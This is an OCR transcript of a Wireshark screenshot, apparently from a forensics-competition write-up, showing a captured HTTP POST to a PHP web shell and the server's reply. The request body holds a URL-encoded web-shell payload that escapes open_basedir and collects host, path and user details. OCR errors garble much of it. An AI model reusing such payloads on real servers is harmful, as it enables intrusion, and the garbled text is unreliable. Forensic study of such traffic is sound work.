@@ -1,0 +1,21 @@
+# OCR: c8f83fb18426570c5198f05c3811fd17.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/c8f83fb18426570c5198f05c3811fd17.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Wireshark·追踪HTTP流(tcp.streameq110)·tcpdump_tj.cap
+PoST/peiqi.phpHTrP/i.1 Host:222.2.2.180
+Accept-Encoding:gzip,deflate
+User-Agent:Opera/12.e(WindowsNT5.2U;en)Presto/22.9.168Version/12.ee Content-Type:application/x-ww-form-urlencoded
+Content-Length:1484 Connection:close
+口
+x
+peiqi=%40iniset(%22display_errors%22%2c%20%220%22)%3B%40settime1imit(0)%3B%240pdir%3D%40iniget(%22openbasedir%22)%3Bif(%24opdir）%20%7B%24oparr%3Dpregsplit(%22%2F%5c%5c%5c%5 C%7C%5C%2F%2F%22%2C%24opdir)%3B%24oCwd%3Ddirname（%24_SERVER%5B%225CRIPT_FILENAME%22%5D）%3B%24tmdir%3D%22.71bec4%22%3B%40mkdir(%24tmdir）%3B%40chdir（%24tmdir）%3B%4eini_set(%22open ba5edir%22%2C%22..%22)%3Bfor（%24i%3De%3B%241%3Csizeof（%24oparr）%3B%241%2B%2B)%7B%40chdir（%22..%22）%3B%7D%4eini5et（%22openbasedir%22%2C%22%2F%22)%3B%48rmdir（%24ocwd.%22%2F%22.%2 4tmdir)%3B%7D%3Bfunction%20asenc(%24out)%7Breturn%2e%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_getcontents()%3Bobendclean()%3Becho%20%22db5d2%22.%229ffec4%22%3Becho%20%40asenc(%24output）%3Becho%20%222f53%22.%2225eb2%22%3B%7Dobstart()%3Btry%7B%24D%3Ddirname（%24SERVER%5B%22SCRIPTFILENAME%22%5D）%3Bif(%24D%3D%3D%22%22）%24D%3Ddirname（%24SERV ER%5B%22PATH_TRANSLATED%22%5D）%3B%24R%3D%22%7B%24D%7D%09%22%3Bif（substr（%24D%2C0%2C1)！%3D%22%2F%22）%7Bforeach（range（%22C%22%2C%22Z%22)as%20%24L）if（isdir（%22%7B%24L%7D%3A%22））%24 R.%3D%22%7B%24L%7D%3A%22%3B%7De1se%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists（%22p0six_getegid%22））%3F%40posix_getpwuid(%40pos1x_geteuid(））%3A%22%22%3B% 24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERR0R%3A
+%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3BHTTP/1.12ee.OK Server:nginx
+Date:Fri,04Mar202207:16:25GMT
+Content-Type:text/html; charset=UTF-8
+Transfer-Encoding:chunked Connection:close
+Vary:Accept-Encoding Content-Encoding:gzip
+db5d29ffec4/www/wwroot/ww.tpshop.com
+Linuxlocalhost.1ocaldomain3.10.e-514.el7.x86_64#1SMpTueNov2216:42:41UTc2016x86_64
+ww2f5325eb2
